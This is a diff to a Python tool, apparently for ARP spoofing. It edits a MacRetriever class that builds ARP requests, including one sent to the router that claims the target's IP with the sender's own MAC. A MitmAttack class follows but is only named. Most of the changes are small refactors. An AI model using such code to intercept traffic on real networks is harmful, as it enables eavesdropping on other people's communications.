@@ -16,7 +16,7 @@ class Host(Enum):
     ROUTER = auto()
 
 class MacRetriever:
-    def __init__(self, args: MacDiscoverArgs):
+    def __init__(self, args: MacRetrieverArgs):
         self.sock = None
         self.receiver = None
 
@@ -121,7 +121,7 @@ class MacRetriever:
             Host.TARGET,
             EtherHeader(
                 dest_mac=binascii.unhexlify(
-                    ":".join(["ff" for i in range(6)])
+                    "ff:ff:ff:ff:ff:ff".replace(":", "")
                 ),
                 source_mac=self.your_mac,
                 protocol=self.protocol
@@ -135,7 +135,7 @@ class MacRetriever:
                 sender_mac=self.your_mac,
                 sender_ip=self.your_ip,
                 dest_mac=binascii.unhexlify(
-                    ":".join(["00" for i in range(6)])
+                    "00:00:00:00:00:00".replace(":", "")
                 ),
                 dest_ip=self.target_ip
             )
@@ -145,9 +145,9 @@ class MacRetriever:
             Host.ROUTER,
             EtherHeader(
                 dest_mac=binascii.unhexlify(
-                    ":".join(["ff" for i in range(6)])
+                    "ff:ff:ff:ff:ff:ff".replace(":", "")
                 ),
-                source_mac=self._target_mac,
+                source_mac=self.your_mac,
                 protocol=self.protocol
             ),
             ArpHeader(
@@ -156,17 +156,17 @@ class MacRetriever:
                 hlen=self.hlen,
                 plen=self.plen,
                 operation=self.operation,
-                sender_mac=self._target_mac,
+                sender_mac=self.your_mac,
                 sender_ip=self.target_ip,
                 dest_mac=binascii.unhexlify(
-                    ":".join(["00" for i in range(6)])
+                    "00:00:00:00:00:00".replace(":", "")
                 ),
                 dest_ip=self.router_ip
             )
         )
 
         self.sock.close()
-        self._clean_attrs()
+        #self._clean_attrs()
 
 class MitmAttack:
     def __init__(self, args: MitmArgs):
